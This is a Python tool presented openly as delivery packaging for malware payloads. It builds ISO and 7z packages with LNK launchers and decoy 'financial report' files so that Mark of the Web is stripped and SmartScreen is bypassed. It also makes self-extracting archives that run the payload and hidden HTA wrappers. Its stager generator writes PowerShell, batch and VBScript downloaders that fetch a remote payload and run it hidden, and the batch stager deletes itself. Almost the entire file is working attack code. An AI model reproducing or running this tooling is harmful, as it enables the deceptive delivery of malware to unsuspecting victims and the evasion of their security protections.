#!/usr/bin/env python3
"""Unified delivery packaging for malware payloads.

Supports PE, JScript, VBScript, and Batch payloads. Generates delivery mechanisms
that strip Mark of the Web (MOTW) for SmartScreen bypass.

Packaging methods:
- iso: ISO disk image with LNK launcher + decoy
- 7z: 7-Zip archive (MOTW stripped on extract)
- lnk: Standalone LNK shortcut
- sfx: 7z self-extracting archive
- stager: Downloader script (PowerShell/batch)
- hta: HTA wrapper (scripts only)
"""
import os
import shutil
import struct
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Optional


@dataclass
class DeliveryResult:
    """Result of delivery packaging."""
    method: str
    path: str
    size: int
    contents: list[str]
    success: bool
    error: Optional[str] = None


def _detect_payload_type(payload_path: str) -> str:
    """Detect payload type from extension."""
    ext = Path(payload_path).suffix.lower()
    if ext in ('.exe', '.dll', '.cpl'):
        return 'pe'
    elif ext == '.js':
        return 'jscript'
    elif ext == '.vbs':
        return 'vbscript'
    elif ext == '.bat':
        return 'batch'
    elif ext == '.ps1':
        return 'powershell'
    return 'unknown'


def _create_lnk(target_path: str, arguments: str, lnk_path: str,
                icon_location: str = "", working_dir: str = "",
                show_cmd: int = 7, description: str = "Document") -> bool:
    """Create a .lnk (shell link) file following MS-SHLLINK spec."""
    header_size = 0x4C
    link_clsid = b'\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46'

    # Flags: HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation
    flags = 0x00000008 | 0x00000010 | 0x00000020 | 0x00000040
    file_attrs = 0
    timestamps = b'\x00' * 24  # c_time + a_time + w_time
    file_size = 0
    icon_index = 0
    hotkey = 0

    header = struct.pack('<I', header_size)
    header += link_clsid
    header += struct.pack('<I', flags)
    header += struct.pack('<I', file_attrs)
    header += timestamps
    header += struct.pack('<I', file_size)
    header += struct.pack('<I', icon_index)
    header += struct.pack('<I', show_cmd)
    header += struct.pack('<H', hotkey)
    header += b'\x00' * 10  # Reserved

    def _str_data(s: str) -> bytes:
        encoded = s.encode('utf-16-le')
        return struct.pack('<H', len(s)) + encoded

    strings = b''
    strings += _str_data(target_path)
    strings += _str_data(working_dir or "C:\\Windows\\System32")
    strings += _str_data(arguments)
    strings += _str_data(icon_location or "C:\\Windows\\System32\\shell32.dll,3")

    try:
        with open(lnk_path, 'wb') as f:
            f.write(header + strings)
        return True
    except Exception:
        return False


def _get_lnk_config(payload_path: str, payload_type: str) -> dict:
    """Get LNK configuration based on payload type."""
    payload_name = os.path.basename(payload_path)

    if payload_type == 'pe':
        return {
            'target': payload_name,
            'arguments': '',
            'icon': 'C:\\Windows\\System32\\shell32.dll,3',  # Folder icon
            'working_dir': '',
        }
    elif payload_type == 'jscript':
        return {
            'target': 'C:\\Windows\\System32\\cscript.exe',
            'arguments': f'//nologo //E:jscript "{payload_name}"',
            'icon': 'C:\\Windows\\System32\\shell32.dll,1',  # Document icon
            'working_dir': 'C:\\Windows\\System32',
        }
    elif payload_type == 'vbscript':
        return {
            'target': 'C:\\Windows\\System32\\cscript.exe',
            'arguments': f'//nologo //E:vbscript "{payload_name}"',
            'icon': 'C:\\Windows\\System32\\shell32.dll,1',
            'working_dir': 'C:\\Windows\\System32',
        }
    elif payload_type == 'batch':
        return {
            'target': 'C:\\Windows\\System32\\cmd.exe',
            'arguments': f'/c "{payload_name}"',
            'icon': 'C:\\Windows\\System32\\shell32.dll,3',
            'working_dir': '',
        }
    elif payload_type == 'powershell':
        return {
            'target': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'arguments': f'-ExecutionPolicy Bypass -File "{payload_name}"',
            'icon': 'C:\\Windows\\System32\\shell32.dll,1',
            'working_dir': '',
        }
    else:
        return {
            'target': payload_name,
            'arguments': '',
            'icon': 'C:\\Windows\\System32\\shell32.dll,3',
            'working_dir': '',
        }


def create_iso(payload_path: str, output_dir: str,
               decoy_name: str = "Q3 Financial Report.txt",
               decoy_path: Optional[str] = None,
               lnk_name: str = "Open Report") -> DeliveryResult:
    """Create ISO disk image with payload, LNK launcher, and decoy."""

    if not os.path.isfile(payload_path):
        return DeliveryResult('iso', '', 0, [], False, f"Payload not found: {payload_path}")

    iso_tool = shutil.which("genisoimage") or shutil.which("mkisofs")
    if not iso_tool:
        return DeliveryResult('iso', '', 0, [], False,
            "genisoimage/mkisofs not found. Install: apt install genisoimage")

    payload_type = _detect_payload_type(payload_path)
    payload_name = os.path.basename(payload_path)
    output_iso = os.path.join(output_dir, "payload.iso")

    staging = tempfile.mkdtemp(prefix="iso_pkg_")
    try:
        # Copy payload
        shutil.copy2(payload_path, os.path.join(staging, payload_name))

        # Create or copy decoy
        decoy_dest = os.path.join(staging, decoy_name)
        if decoy_path and os.path.isfile(decoy_path):
            shutil.copy2(decoy_path, decoy_dest)
        else:
            with open(decoy_dest, 'w') as f:
                f.write(
                    "This document has been moved to a secure location.\n\n"
                    "Please contact your IT administrator for access.\n\n"
                    f"Reference: DOC-2026-{os.urandom(3).hex().upper()}\n"
                )

        # Create LNK
        lnk_config = _get_lnk_config(payload_path, payload_type)
        lnk_file = os.path.join(staging, f"{lnk_name}.lnk")
        _create_lnk(
            target_path=lnk_config['target'],
            arguments=lnk_config['arguments'],
            lnk_path=lnk_file,
            icon_location=lnk_config['icon'],
            working_dir=lnk_config['working_dir'],
        )

        # Build ISO
        cmd = [
            iso_tool,
            "-o", output_iso,
            "-V", "DOCUMENTS",
            "-J", "-r",
            staging,
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            return DeliveryResult('iso', '', 0, [], False, f"ISO creation failed: {result.stderr}")

        size = os.path.getsize(output_iso)
        contents = [f"{lnk_name}.lnk", decoy_name, payload_name]
        return DeliveryResult('iso', output_iso, size, contents, True)

    finally:
        shutil.rmtree(staging, ignore_errors=True)


def create_7z(payload_path: str, output_dir: str,
              decoy_name: str = "Q3 Financial Report.txt",
              decoy_path: Optional[str] = None,
              password: Optional[str] = None) -> DeliveryResult:
    """Create 7-Zip archive (MOTW stripped on extract)."""

    if not os.path.isfile(payload_path):
        return DeliveryResult('7z', '', 0, [], False, f"Payload not found: {payload_path}")

    sz_tool = shutil.which("7z") or shutil.which("7za")
    if not sz_tool:
        return DeliveryResult('7z', '', 0, [], False,
            "7z not found. Install: apt install p7zip-full")

    payload_name = os.path.basename(payload_path)
    output_7z = os.path.join(output_dir, "payload.7z")

    staging = tempfile.mkdtemp(prefix="7z_pkg_")
    try:
        # Copy payload
        shutil.copy2(payload_path, os.path.join(staging, payload_name))

        # Create or copy decoy
        decoy_dest = os.path.join(staging, decoy_name)
        if decoy_path and os.path.isfile(decoy_path):
            shutil.copy2(decoy_path, decoy_dest)
        else:
            with open(decoy_dest, 'w') as f:
                f.write(
                    "This document has been moved to a secure location.\n\n"
                    "Please contact your IT administrator for access.\n\n"
                    f"Reference: DOC-2026-{os.urandom(3).hex().upper()}\n"
                )

        # Build archive
        cmd = [sz_tool, "a", "-t7z", "-mx=9"]
        if password:
            cmd.extend([f"-p{password}", "-mhe=on"])
        cmd.extend([output_7z, os.path.join(staging, "*")])

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            return DeliveryResult('7z', '', 0, [], False, f"7z creation failed: {result.stderr}")

        size = os.path.getsize(output_7z)
        contents = [payload_name, decoy_name]
        return DeliveryResult('7z', output_7z, size, contents, True)

    finally:
        shutil.rmtree(staging, ignore_errors=True)


def create_lnk(payload_path: str, output_dir: str,
               lnk_name: str = "Open Document") -> DeliveryResult:
    """Create standalone LNK shortcut."""

    if not os.path.isfile(payload_path):
        return DeliveryResult('lnk', '', 0, [], False, f"Payload not found: {payload_path}")

    payload_type = _detect_payload_type(payload_path)
    lnk_config = _get_lnk_config(payload_path, payload_type)
    lnk_file = os.path.join(output_dir, f"{lnk_name}.lnk")

    success = _create_lnk(
        target_path=lnk_config['target'],
        arguments=lnk_config['arguments'],
        lnk_path=lnk_file,
        icon_location=lnk_config['icon'],
        working_dir=lnk_config['working_dir'],
    )

    if not success:
        return DeliveryResult('lnk', '', 0, [], False, "Failed to create LNK")

    size = os.path.getsize(lnk_file)
    return DeliveryResult('lnk', lnk_file, size, [f"{lnk_name}.lnk"], True)


def create_sfx(payload_path: str, output_dir: str,
               sfx_name: str = "setup.exe") -> DeliveryResult:
    """Create 7z self-extracting archive that runs payload on extract."""

    if not os.path.isfile(payload_path):
        return DeliveryResult('sfx', '', 0, [], False, f"Payload not found: {payload_path}")

    sz_tool = shutil.which("7z") or shutil.which("7za")
    if not sz_tool:
        return DeliveryResult('sfx', '', 0, [], False,
            "7z not found. Install: apt install p7zip-full")

    # Check for SFX module
    sfx_modules = [
        "/usr/lib/p7zip/7z.sfx",
        "/usr/lib/p7zip/7zCon.sfx",
        "/usr/share/doc/p7zip/DOC/7z.sfx",
    ]
    sfx_module = None
    for mod in sfx_modules:
        if os.path.isfile(mod):
            sfx_module = mod
            break

    if not sfx_module:
        return DeliveryResult('sfx', '', 0, [], False,
            "7z SFX module not found. Install: apt install p7zip-full")

    payload_name = os.path.basename(payload_path)
    payload_type = _detect_payload_type(payload_path)
    output_sfx = os.path.join(output_dir, sfx_name)

    staging = tempfile.mkdtemp(prefix="sfx_pkg_")
    try:
        # Copy payload
        shutil.copy2(payload_path, os.path.join(staging, payload_name))

        # Create SFX config
        if payload_type == 'pe':
            run_cmd = payload_name
        elif payload_type == 'jscript':
            run_cmd = f'cscript //nologo //E:jscript "{payload_name}"'
        elif payload_type == 'vbscript':
            run_cmd = f'cscript //nologo //E:vbscript "{payload_name}"'
        elif payload_type == 'batch':
            run_cmd = f'cmd /c "{payload_name}"'
        else:
            run_cmd = payload_name

        config_path = os.path.join(staging, "config.txt")
        with open(config_path, 'w') as f:
            f.write(f";!@Install@!UTF-8!\n")
            f.write(f'RunProgram="{run_cmd}"\n')
            f.write(f";!@InstallEnd@!\n")

        # Create 7z archive
        archive_path = os.path.join(staging, "archive.7z")
        cmd = [sz_tool, "a", "-t7z", "-mx=9", archive_path, os.path.join(staging, payload_name)]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            return DeliveryResult('sfx', '', 0, [], False, f"7z archive failed: {result.stderr}")

        # Combine: SFX module + config + archive
        with open(output_sfx, 'wb') as out:
            with open(sfx_module, 'rb') as f:
                out.write(f.read())
            with open(config_path, 'rb') as f:
                out.write(f.read())
            with open(archive_path, 'rb') as f:
                out.write(f.read())

        size = os.path.getsize(output_sfx)
        return DeliveryResult('sfx', output_sfx, size, [sfx_name], True)

    finally:
        shutil.rmtree(staging, ignore_errors=True)


def create_stager(payload_url: str, output_dir: str,
                  payload_name: str = "payload.exe",
                  stager_type: str = "powershell") -> DeliveryResult:
    """Create downloader stager script."""

    if stager_type == "powershell":
        stager_content = f'''$u="{payload_url}"
$p="$env:TEMP\\{payload_name}"
try {{
    $c=New-Object System.Net.WebClient
    $c.Headers.Add("User-Agent","Mozilla/5.0")
    $c.DownloadFile($u,$p)
    Unblock-File -Path $p -ErrorAction SilentlyContinue
    Start-Process -FilePath $p -WindowStyle Hidden
}} catch {{}}
'''
        stager_file = os.path.join(output_dir, "stager.ps1")

    elif stager_type == "batch":
        stager_content = f'''@echo off
set u={payload_url}
set p=%TEMP%\\{payload_name}
curl -s -o "%p%" "%u%" 2>nul || certutil -urlcache -split -f "%u%" "%p%" >nul 2>&1
if exist "%p%" start "" /b "%p%"
del "%~f0"
'''
        stager_file = os.path.join(output_dir, "stager.bat")

    elif stager_type == "vbscript":
        stager_content = f'''Set x=CreateObject("MSXML2.XMLHTTP")
x.Open "GET","{payload_url}",False
x.Send
Set s=CreateObject("ADODB.Stream")
s.Type=1:s.Open:s.Write x.responseBody
p=CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")&"\\{payload_name}"
s.SaveToFile p,2:s.Close
CreateObject("WScript.Shell").Run p,0,False
'''
        stager_file = os.path.join(output_dir, "stager.vbs")

    else:
        return DeliveryResult('stager', '', 0, [], False, f"Unknown stager type: {stager_type}")

    try:
        with open(stager_file, 'w') as f:
            f.write(stager_content)
        size = os.path.getsize(stager_file)
        return DeliveryResult('stager', stager_file, size, [os.path.basename(stager_file)], True)
    except Exception as e:
        return DeliveryResult('stager', '', 0, [], False, str(e))


def create_hta(payload_path: str, output_dir: str,
               hta_name: str = "document.hta") -> DeliveryResult:
    """Create HTA wrapper for script payloads."""

    if not os.path.isfile(payload_path):
        return DeliveryResult('hta', '', 0, [], False, f"Payload not found: {payload_path}")

    payload_type = _detect_payload_type(payload_path)
    if payload_type not in ('jscript', 'vbscript'):
        return DeliveryResult('hta', '', 0, [], False,
            f"HTA only supports JScript/VBScript, got: {payload_type}")

    with open(payload_path, 'r') as f:
        script_content = f.read()

    lang = "JScript" if payload_type == 'jscript' else "VBScript"

    hta_content = f'''<html>
<head>
<title>Document</title>
<HTA:APPLICATION
  ID="app"
  APPLICATIONNAME="Document"
  BORDER="none"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  WINDOWSTATE="minimize"
/>
<script language="{lang}">
window.resizeTo(0,0);
window.moveTo(-1000,-1000);
{script_content}
window.close();
</script>
</head>
<body></body>
</html>
'''

    hta_file = os.path.join(output_dir, hta_name)
    try:
        with open(hta_file, 'w') as f:
            f.write(hta_content)
        size = os.path.getsize(hta_file)
        return DeliveryResult('hta', hta_file, size, [hta_name], True)
    except Exception as e:
        return DeliveryResult('hta', '', 0, [], False, str(e))


def package(payload_path: str, output_dir: str, methods: list[str] = None,
            decoy_name: str = "Q3 Financial Report.txt",
            decoy_path: Optional[str] = None,
            lnk_name: str = "Open Report",
            stager_url: Optional[str] = None) -> dict[str, DeliveryResult]:
    """Generate multiple delivery packages for a payload.

    Args:
        payload_path: Path to the payload file
        output_dir: Directory to write delivery packages
        methods: List of methods to use. Default: ['iso', '7z', 'lnk']
        decoy_name: Filename for decoy document
        decoy_path: Optional custom decoy file
        lnk_name: Display name for LNK shortcut
        stager_url: URL for stager download (required if 'stager' in methods)

    Returns:
        Dict mapping method name to DeliveryResult
    """
    if methods is None:
        methods = ['iso', '7z', 'lnk']

    # Create delivery subdirectory
    delivery_dir = os.path.join(output_dir, 'delivery')
    os.makedirs(delivery_dir, exist_ok=True)

    results = {}
    payload_type = _detect_payload_type(payload_path)

    for method in methods:
        if method == 'iso':
            results['iso'] = create_iso(payload_path, delivery_dir,
                                         decoy_name, decoy_path, lnk_name)
        elif method == '7z':
            results['7z'] = create_7z(payload_path, delivery_dir,
                                       decoy_name, decoy_path)
        elif method == 'lnk':
            results['lnk'] = create_lnk(payload_path, delivery_dir, lnk_name)
        elif method == 'sfx':
            results['sfx'] = create_sfx(payload_path, delivery_dir)
        elif method == 'stager':
            if not stager_url:
                results['stager'] = DeliveryResult('stager', '', 0, [], False,
                    "stager_url required for stager method")
            else:
                payload_name = os.path.basename(payload_path)
                results['stager'] = create_stager(stager_url, delivery_dir, payload_name)
        elif method == 'hta':
            if payload_type in ('jscript', 'vbscript'):
                results['hta'] = create_hta(payload_path, delivery_dir)
            else:
                results['hta'] = DeliveryResult('hta', '', 0, [], False,
                    f"HTA not supported for {payload_type}")
        else:
            results[method] = DeliveryResult(method, '', 0, [], False,
                f"Unknown method: {method}")

    return results


def main():
    """CLI interface for delivery packaging."""
    import argparse

    parser = argparse.ArgumentParser(description="Package payload for delivery")
    parser.add_argument("payload", help="Path to payload file")
    parser.add_argument("-o", "--output", default=".", help="Output directory")
    parser.add_argument("-m", "--methods", nargs="+",
                        default=["iso", "7z", "lnk"],
                        choices=["iso", "7z", "lnk", "sfx", "stager", "hta"],
                        help="Delivery methods to generate")
    parser.add_argument("--decoy-name", default="Q3 Financial Report.txt",
                        help="Decoy document filename")
    parser.add_argument("--decoy", dest="decoy_path",
                        help="Custom decoy file path")
    parser.add_argument("--lnk-name", default="Open Report",
                        help="LNK shortcut display name")
    parser.add_argument("--stager-url", help="URL for stager download")

    args = parser.parse_args()

    results = package(
        args.payload,
        args.output,
        methods=args.methods,
        decoy_name=args.decoy_name,
        decoy_path=args.decoy_path,
        lnk_name=args.lnk_name,
        stager_url=args.stager_url,
    )

    print(f"\nDelivery packages for: {args.payload}")
    print("=" * 60)

    for method, result in results.items():
        if result.success:
            print(f"[OK] {method}: {result.path} ({result.size:,} bytes)")
            for item in result.contents:
                print(f"     - {item}")
        else:
            print(f"[FAIL] {method}: {result.error}")

    success_count = sum(1 for r in results.values() if r.success)
    print(f"\n{success_count}/{len(results)} packages created successfully")


if __name__ == "__main__":
    main()
